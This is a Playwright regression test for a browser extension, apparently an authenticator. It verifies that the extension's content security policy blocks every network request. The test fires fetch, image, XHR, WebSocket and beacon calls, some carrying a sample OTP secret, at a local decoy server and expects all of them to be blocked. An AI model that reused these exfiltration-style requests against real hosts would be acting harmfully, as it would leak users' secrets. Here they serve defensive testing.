// Regression: the network (SYNC-DESIGN §7, §4.9). Since the server sync's client went (OWNER-DECISIONS/25, DV-0b) the
// extension reaches no API at all: the e2e build's manifest connect-src names one source only, the site rules' updater's
// one path (https://rules.fix.test/v1/, with its release gate open; test/e2e/rules-update.spec.ts has that read), and each
// page carries its own connect-src 'none' on top of it, so the worker is the one context that could reach even that. The
// browser enforces it; the build checks it again (scripts/check-dist.mjs: no API origin in any shipped file, `fetch` in
// the worker only for the updater).
//   1. A recording server on the address the dev and e2e builds' API origin had (127.0.0.1:8787), and a decoy on a
//      random port.
//   2. The extension used (first run, an account added, the popup, the settings page): neither gets anything.
//   3. fetch, image, XHR, WebSocket and beacon from the popup and the settings page, and fetch from the worker, to the
//      decoy: all blocked, nothing arrives.
//   4. The old API origin from the worker too: blocked (no source of the CSP names it any more), and from a page, as an
//      image or a fetch.
// (A fifth step turned sync on through the developer sync page and checked the wire of an edit synced; it went with that
// page and the settings page's Sync section, from every build, and the step that let the worker reach the API origin went
// with the rest of the client: DV-0b.)
import { expect, test } from "@playwright/test";
import { createServer, type Server } from "node:http";
import { addByPaste, AWS_URI, close, launch, openPopup, startFresh, type Profile } from "../e2e/harness";

/** The dev and e2e builds' API origin until DV-0b: now an address like any other. */
const OLD_API = "http://127.0.0.1:8787";

/** A server on `port` (0: a free one) of the loopback address that answers 200 and records every request. */
async function recording(port: number): Promise<{ server: Server; hits: string[]; base: string }> {
  const hits: string[] = [];
  const server = createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { "content-type": "image/gif", "access-control-allow-origin": "*" });
    res.end();
  });
  await new Promise<void>((ok, err) => {
    server.once("error", err);
    server.listen(port, "127.0.0.1", () => ok());
  });
  return { server, hits, base: `http://127.0.0.1:${(server.address() as { port: number }).port}` };
}

let decoy: Awaited<ReturnType<typeof recording>>;
let api: Awaited<ReturnType<typeof recording>>;

test.beforeAll(async () => {
  decoy = await recording(0);
  api = await recording(8787);
});
test.afterAll(async () => {
  decoy.server.close();
  api.server.close();
});

test("nothing leaves the extension: no request to the old API origin or anywhere else, from any context", async () => {
  const p: Profile = await launch();
  try {
    // 2. the extension used
    await startFresh(p);
    await addByPaste(p, AWS_URI);
    const pop = await openPopup(p);
    await expect(pop.locator(".row")).toHaveCount(1);
    await pop.close();
    await new Promise((r) => setTimeout(r, 500));
    expect(api.hits).toEqual([]);
    expect(decoy.hits).toEqual([]);

    // 3. every primitive, from every page, to the decoy; and 4. the old API origin from a page
    for (const path of ["options/index.html", "popup/index.html"]) {
      const page = await p.ctx.newPage();
      await page.goto(`chrome-extension://${p.id}/${path}`);
      const results = await page.evaluate(
        async ([base, apiOrigin]) => {
          const out: Record<string, string> = {};
          const img = (u: string) =>
            new Promise((r) => {
              const i = new Image();
              i.onload = () => r("sent");
              i.onerror = () => r("blocked");
              i.src = u;
            });
          out.fetch = await fetch(`${base}/fetch?secret=JBSWY3DP`, { mode: "no-cors" }).then(
            () => "sent",
            () => "blocked",
          );
          out.img = (await img(`${base}/img?secret=JBSWY3DP`)) as string;
          out.xhr = await new Promise((r) => {
            const x = new XMLHttpRequest();
            x.onload = () => r("sent");
            x.onerror = () => r("blocked");
            x.open("GET", `${base}/xhr`);
            x.send();
          });
          out.beacon = navigator.sendBeacon(`${base}/beacon`, "JBSWY3DP") ? "queued" : "blocked";
          out.ws = await new Promise((r) => {
            try {
              const w = new WebSocket(`ws://127.0.0.1:${new URL(base).port}/ws`);
              w.onopen = () => r("sent");
              w.onerror = () => r("blocked");
            } catch {
              r("blocked");
            }
          });
          out.apiImg = (await img(`${apiOrigin}/img`)) as string; // img-src is 'self' data:
          out.apiFetch = await fetch(`${apiOrigin}/fetch`, { mode: "no-cors" }).then(
            () => "sent",
            () => "blocked",
          );
          return out;
        },
        [decoy.base, OLD_API] as const,
      );
      expect(results.fetch, path).toBe("blocked");
      expect(results.img, path).toBe("blocked");
      expect(results.xhr, path).toBe("blocked");
      expect(results.ws, path).toBe("blocked");
      expect(results.apiImg, path).toBe("blocked");
      expect(results.apiFetch, path).toBe("blocked");
      await page.close();
    }

    // 3. and 4. from the worker: the decoy and the old API origin, each blocked before anything leaves
    const sw = p.ctx.serviceWorkers()[0]!;
    for (const url of [`${decoy.base}/sw?secret=JBSWY3DP`, `${OLD_API}/healthz`, `${OLD_API}/v1/vault`])
      expect(
        await sw.evaluate(
          async (u) =>
            fetch(u, { mode: "no-cors" }).then(
              () => "sent",
              () => "blocked",
            ),
          url,
        ),
        url,
      ).toBe("blocked");
    await new Promise((r) => setTimeout(r, 500));
    expect(decoy.hits).toEqual([]); // nothing, including beacons, reached the decoy
    expect(api.hits).toEqual([]); // nor the old API origin, from any context
  } finally {
    await close(p);
  }
});
